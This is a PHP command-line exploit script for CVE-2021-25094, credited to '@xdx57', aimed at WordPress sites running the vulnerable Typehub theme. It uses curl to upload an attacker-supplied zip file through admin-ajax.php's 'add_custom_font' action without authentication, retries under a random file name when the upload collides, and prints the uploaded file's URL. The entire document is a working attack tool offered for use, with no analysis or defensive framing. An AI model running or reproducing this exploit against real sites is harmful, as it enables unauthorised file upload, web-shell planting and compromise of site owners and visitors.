<?php
$ban = "\e[1m{ Typehub Exploiter - CVE-2021-25094 }\e[0m\n\e[3m_Coded by @xdx57\e[0m\n\n";
system('clear');

if(count($argv) != 3 || substr($argv[1],0,4) != 'http'){
	die($ban."Usage: $argv[0] https://valid-url.com/ zip_file.zip\n");
}elseif(!is_file($argv[2])){
	die($ban."Error: `$argv[2]` No such file.\n");
}elseif(strtolower(pathinfo($argv[2],PATHINFO_EXTENSION)) != 'zip'){
	die($ban."Error: `$argv[2]` Invalid zip extension.\n");
}

$a = $argv[1];
$ua = 'xdx'.rand(1,57);
$zip = $argv[2];
$a = substr($a,-1,1) == '/' ? $a:$a.'/';
$a = preg_match('/wp-content/',$a) ? explode('wp-content',$a)[0] : $a;
$b = $a.'wp-admin/admin-ajax.php';
print "{$ban}Target\t: $a\nZipFile\t: $zip\n\n";

$exe = json_decode(shell_exec("curl -sL --user-agent $ua $b -F \"action=add_custom_font\" -F \"file=@$zip\""));
print "Status\t: ";
if($exe){
	if(!empty($msg=ucfirst(@$exe->{'status'}))){
		print "$msg\n";
		if($msg == 'File already exists'){
			$n = rand(111,999).'.zip';
			print "System\t: $zip -> $n ";
			if(rename($zip,$n)){
				print "-> Done\n";
				sleep(5);
				system("php $argv[0] $a $n");
			}else{
				die("-> Something is wrong\n");
			}
		}
		if(!empty($url=@$exe->{'url'})){
			print "Url\t: $url\n";
		}
	}
}else{
	print "\e[91mCan't Execute Command\e[0m\n";
}
